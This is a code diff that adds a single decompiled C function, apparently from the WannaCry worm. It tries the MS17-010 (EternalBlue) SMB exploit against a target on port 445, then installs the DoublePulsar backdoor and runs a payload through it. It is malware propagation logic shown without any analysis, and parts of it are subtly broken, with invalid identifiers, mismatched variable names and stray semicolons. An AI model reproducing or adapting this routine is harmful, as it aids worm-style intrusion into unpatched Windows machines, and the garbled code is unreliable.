@@ -1,0 +1,34 @@
+int _cdecl MS17_010_attempt_pwn_thread(struct in-addr in)
+{
+char *v1; // eax@1
+signed int v2; // edi@2
+char Dest; // [esp+4h] [ebp-104h]@1
+char v5; // [esp+5h] [ebp-103h]@1
+_int16 v6; // [esp+105h] [ebp-3h]@1
+char v7; // [esp+107h] [ebp-1h]@1
+Dest = 0;
+memset(&v5, 0, 0x100u);
+v6 = 0;
+v7 = 0;
+v1 = inet_Ntoa(in);
+strncpy(&dest, v1, 0x10u);
+if ( try_first_set_of_buffer(&Dest, 445u) )
+{
+v2 = 0;
+do
+{
+Sleep(3000u);
+if ( doublepulsar_installation(&Dest, 1, 445u) )
+break;
+Sleep(3000u);
+try_second_set_of_buffers(&Dest, 445u);
+++v2;
+}
+while ( v2 < 5 );
+}
+Sleep(3000u);
+if ( doublepulsar_installation(&Dest, 1, 445u) );
+if ( doublepulsar_run_payload(&Dest, 1, 445u) );
+endthreadex(0);
+return 0;
+}
